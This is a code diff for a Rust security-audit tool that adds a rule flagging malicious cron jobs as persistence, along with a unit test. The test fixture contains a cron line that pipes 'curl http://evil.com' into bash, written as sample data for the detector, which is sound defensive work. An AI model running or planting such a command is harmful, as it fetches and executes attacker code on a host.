@@ -1,4 +1,4 @@
-use crate::models::AgentReport;
+use crate::models::{AgentReport, CronSeverity};
 
 // ── Legacy constants (kept for backward compatibility) ─────
 
@@ -357,12 +357,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
     }
 
     // ── SEC-016 — known malware/miner processes (full /proc sweep) ──
-    // Source is now report.security.suspicious_processes, populated during the
-    // single /proc walk in capabilities.rs. This replaces the partial
-    // top_memory + capability_audit union and closes the root/low-memory blind
-    // spot. FP-corroboration (ambiguous names ⇒ ephemeral exe) already applied
-    // upstream, so every entry here is report-worthy as-is. Host strings are
-    // sanitized at render time (PIVOT-1), embedded raw by design.
     if !report.security.suspicious_processes.is_empty() {
         let list = report
             .security
@@ -386,6 +380,36 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             ),
             suppressed: None,
             cis_ref: None,
+        });
+    }
+
+    // ── SEC-017 – Malicious cron job detected ────────────────
+    if let Some(_critical) = report
+        .host
+        .cron_jobs
+        .iter()
+        .find(|c| c.severity == CronSeverity::Critical)
+    {
+        let critical_jobs: Vec<&str> = report
+            .host
+            .cron_jobs
+            .iter()
+            .filter(|c| c.severity == CronSeverity::Critical)
+            .map(|c| c.command.as_str())
+            .collect();
+
+        findings.push(Finding {
+            id: "SEC-017",
+            title: "Suspicious cron job detected (possible persistence)".to_string(),
+            category: Category::Security,
+            weight: 20,
+            evidence: format!(
+                "{} suspicious cron job(s): {}",
+                critical_jobs.len(),
+                critical_jobs.join("; ")
+            ),
+            suppressed: None,
+            cis_ref: Some("CIS 5.1.8"),
         });
     }
 
@@ -431,7 +455,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             .filter(|f| f.no_new_privs == Some(false))
             .count();
 
-        // Join privileged non‑root processes with live listeners
         let ports = &report.network.listening_ports;
         let (listening, exposed) =
             report
@@ -488,7 +511,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
     }
 
     // ── Docker container security issues ────────────────
-    // ... (весь существующий код DOCK‑... без изменений)
     let mut has_mem_limit_issue = false;
     let mut has_cpu_limit_issue = false;
     let mut has_privileged = false;
@@ -1066,5 +1088,27 @@ mod tests {
 
         let clean = minimal_report();
         assert!(!evaluate(&clean).iter().any(|f| f.id == "SEC-016"));
+    }
+
+    #[test]
+    fn sec017_detects_critical_cron() {
+        use crate::models::{CronJob, CronSeverity};
+        let mut r = minimal_report();
+        r.host.cron_jobs = vec![
+            CronJob {
+                command: "0 3 * * * root /usr/bin/backup".into(),
+                severity: CronSeverity::Ok,
+            },
+            CronJob {
+                command: "* * * * * root curl http://evil.com | bash -c".into(),
+                severity: CronSeverity::Critical,
+            },
+        ];
+        let f = evaluate(&r)
+            .into_iter()
+            .find(|f| f.id == "SEC-017")
+            .expect("SEC-017 missing");
+        assert_eq!(f.weight, 20);
+        assert!(f.evidence.contains("curl"));
     }
 }
